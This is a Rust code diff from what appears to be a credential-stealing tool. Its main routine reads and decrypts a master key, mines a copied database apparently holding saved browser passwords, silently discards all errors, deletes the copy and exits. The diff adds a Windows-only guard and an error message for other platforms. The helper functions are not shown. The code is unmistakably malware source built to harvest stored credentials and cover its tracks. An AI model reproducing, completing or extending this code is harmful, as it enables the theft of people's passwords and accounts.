@@ -1,5 +1,7 @@
 use aes_gcm::{Aes256Gcm, Nonce, Key};
 use aes_gcm::aead::{Aead, NewAead};
+#[cfg(not(target_family = "windows"))]
+use colored::*;
 use serde_json as json;
 use std::path;
 use std::ptr;
@@ -10,18 +12,26 @@ use windows::Win32::{
 };
 
 fn main() {
-    unsafe {
-        let e = || -> Result<(), Box<dyn std::error::Error>> {
-            let mut key = read_master_key()?;
-            let master_key = decrypt_master_key(&mut key)?;
-            sqlite_shit(&master_key)?;
-            Ok(())
+    #[cfg(target_family = "windows")]
+    {
+        unsafe {
+            let e = || -> Result<(), Box<dyn std::error::Error>> {
+                let mut key = read_master_key()?;
+                let master_key = decrypt_master_key(&mut key)?;
+                sqlite_shit(&master_key)?;
+                Ok(())
+            };
+            if let Err(_) = e() {}
+            std::fs::remove_file("vault_copy.db").unwrap_or_default();
+            std::process::exit(0);
         };
-        if let Err(_) = e() {}
-        std::fs::remove_file("vault_copy.db").unwrap_or_default();
-        std::process::exit(0);
+    }
 
-    };
+    #[cfg(not(target_family = "windows"))]
+    {
+        eprintln!("{} Only Windows is supported at this moment", "!".red());
+        std::process::exit(1);
+    }
 }
 
 fn read_master_key() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
